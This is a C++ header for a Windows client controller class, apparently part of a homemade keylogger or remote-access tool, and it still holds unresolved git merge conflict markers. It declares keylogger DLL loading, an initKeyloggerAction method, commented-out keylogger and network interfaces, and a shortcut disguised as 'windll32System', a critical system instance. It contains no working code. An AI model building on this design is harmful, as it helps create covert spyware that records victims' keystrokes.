#ifndef CLIENT_H__
# define CLIENT_H__

# include "DLibrary.h"
# include "IInfoClient.h"
# include "WorkQueue.h"
# include <Shlobj.h>
# include <queue>
#include <shlwapi.h>
#include "windows.h"
#include "winnls.h"
#include "shobjidl.h"
#include "objbase.h"
#include "objidl.h"
#include "shlguid.h"
#pragma comment(lib, "shlwapi.lib")


# define SHORTCUT_NAME L"\\windll32System.lnk"
# define DESCR			"Critical windll32System instance"

class	clientController {

	DLManager	libraries;

	// Dictionaries
	Dictionary	sayHello;
<<<<<<< HEAD
	Dictionary	infoClient;
=======
	Dictionary	keylogger_dll;

>>>>>>> keylogger_test
public:

	clientController(void) throw(DLibraryException);	// Initialise
	~clientController(void);			        // Destroy

	int			mainAction(int, char**);
	void		sayHelloAction(void);
<<<<<<< HEAD
	void		defineShortcut(void);
	bool		createShortcut(LPCSTR lpszPathObj, LPCWSTR lpszPathLink, LPCSTR descr);
private:
	_I_InfoClient *ifinstance;
	/*IDataHandler *dhinstance;
	IKeylogger *klinstance;
	INetwork *netinstance; */
	WorkQueue _lwqueue;
=======
	void		initKeyloggerAction(void);

>>>>>>> keylogger_test
};

#endif /* !CLIENT_H__ */
